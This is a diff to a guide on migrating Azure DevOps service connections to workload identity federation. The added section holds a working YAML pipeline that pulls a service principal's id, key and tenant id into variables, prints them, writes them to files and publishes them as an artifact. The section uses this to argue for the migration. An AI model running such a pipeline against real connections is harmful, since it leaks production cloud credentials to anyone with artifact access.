@@ -9,6 +9,62 @@ With the recent arrival of the [Public preview of Workload identity federation f
 
 ![authentication methods](./media/recommended_authentication_method.png)
 
+## Why bother?
+
+Not convinced yet? Then run the following simple yaml pipeline against a service principal ARM connection:
+```
+trigger:
+- none
+
+pool:
+  vmImage: windows-latest
+
+steps:
+- task: AzureCLI@2
+  displayName: save service connection secret
+  inputs:
+    azureSubscription: 'doNotUseSP' # use workload identity federation instead (with branch control)
+    scriptType: 'pscore'
+    scriptLocation: 'inlineScript'
+    inlineScript: |
+      Write-Host "##vso[task.setvariable variable=SpId;]$env:servicePrincipalId"
+      Write-Host "##vso[task.setvariable variable=SpKey;]$env:servicePrincipalKey"
+      Write-Host "##vso[task.setvariable variable=TenantId;]$env:tenantId"
+      Write-Host "##vso[task.setvariable variable=TestVar;]ShouldAlwaysSeeMe"
+    addSpnToEnvironment: true
+- task: PowerShell@2
+  displayName: exfiltrate production credentials
+  inputs:
+    targetType: 'inline'
+    script: |
+      Write-Host "Exfiltrating secrets..."
+      Write-Host $env:SpId
+      Write-Host $env:SpKey
+      Write-Host $env:TenantId
+      Write-Host $env:TestVar
+
+      echo $env:SpKey > spkey.txt
+      echo $env:SpId > spid.txt
+      echo $env:TenantId > tenant.txt
+      cat spkey.txt
+      cat spid.txt
+      cat tenant.txt
+- task: CopyFiles@2
+  displayName: copy secrets in plain text
+  inputs:
+    SourceFolder: '$(System.DefaultWorkingDirectory)'
+    Contents: '**/*.txt'
+    TargetFolder: '$(build.artifactstagingdirectory)'
+- task: PublishPipelineArtifact@1
+  displayName: publish secrets
+  inputs:
+    targetPath: '$(build.artifactstagingdirectory)'
+    artifact: 'dropSecretsExfiltrated'
+    publishLocation: 'pipeline'
+```
+You have just exfiltrated production secrets (service principal id and key along with tenant id):
+![avoid service principal exfiltration](/media/avoid_service_principal_secret_exfiltration.png)
+
 ## Before the conversion
 
 First, you will need an inventory of all your Azure DevOps ARM Service Connections which you can obtain from the [az devops CLI](https://learn.microsoft.com/en-us/azure/devops/cli/?view=azure-devops).
@@ -162,3 +218,4 @@ generates a summary such as:
 - [Convert an existing ARM service connection to use workload identity federation](https://learn.microsoft.com/en-us/azure/devops/pipelines/library/connect-to-azure?view=azure-devops#convert-an-existing-arm-service-connection-to-use-workflow-identity-federation)
 - [How to install the Azure CLI](https://learn.microsoft.com/en-us/cli/azure/install-azure-cli)
 - [Get started with Azure DevOps CLI](https://learn.microsoft.com/en-us/azure/devops/cli/?view=azure-devops)
+- [Azure DevOps Service Connection Security](https://microsoft.github.io/code-with-engineering-playbook/continuous-integration/dev-sec-ops/azure-devops/service-connection-security/)
